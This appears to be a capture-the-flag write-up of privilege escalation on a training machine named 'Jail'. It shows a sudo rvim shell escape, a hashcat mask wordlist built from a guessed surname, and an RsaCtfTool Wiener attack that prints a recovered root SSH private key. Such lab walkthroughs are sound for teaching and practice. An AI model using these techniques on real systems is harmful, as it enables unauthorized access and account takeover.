# 25 - PrivEsc

```bash
[frank@localhost ~]$ sudo -l
Matching Defaults entries for frank on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User frank may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
    (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```


# [rvim](https://gtfobins.github.io/gtfobins/rvim/)
```py
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

# adm
```bash
sh-4.2$ id
uid=3(adm) gid=4(adm) groups=4(adm) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

# home directory of adm

![](vx_images/948426921259.png)

# Password protected keys.rar
![](vx_images/1320467687314.png)

# note.txt

![](vx_images/4696590869663.png)

# /var/adm/.keys/.local/.frank 
![](vx_images/1623821556305.png)


![](vx_images/547486917127.png)



Remember note.txt, Administrator reminds Frank about the pasword policy. His password must be his last name followed by 4 a digit number and a symbol. We don't know his last name yet.
Let's look up Alcatraz Escape because it is mentioned in .frank file.

# 1962 Alcatraz Escape
![](vx_images/2731109781454.png)

Frank Morris could be our user, in this case Morris would be the last name. We can try a custom wordlist with morris.

# Word generation with hashcat

```bash
┌─[user@parrot]─[10.10.14.12]─[~/htb/jail]
└──╼ $ hashcat -a 3 Morris?d?d?d?d?s --stdout > wordlist
```

* ?d = any digits
* ?s = any symbols


# Password found

![](vx_images/831010402994.png)



# Extract rootauthorizedsshkey.pub file from keys.rar
![](vx_images/2885908505509.png)


# RsaCtfTool Rsa Attack
```
┌─[user@parrot]─[10.10.14.12]─[/opt/RsaCtfTool]
└──╼ $ ./RsaCtfTool.py  --public ~/htb/jail/user/adm/rootauthorizedsshkey.pub  --private --attack wiener

[*] Testing key /home/user/htb/jail/user/adm/rootauthorizedsshkey.pub.
[*] Performing wiener attack on /home/user/htb/jail/user/adm/rootauthorizedsshkey.pub.
100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 611/611 [00:00<00:00, 3330.09it/s]
 24%|██████████████████████████████████▉                                                                                                                 | 144/611 [00:00<00:00, 10924.64it/s]
[*] Attack success with wiener method !

Results for /home/user/htb/jail/user/adm/rootauthorizedsshkey.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
-----END RSA PRIVATE KEY-----
```


# Root
![](vx_images/5554808158894.png)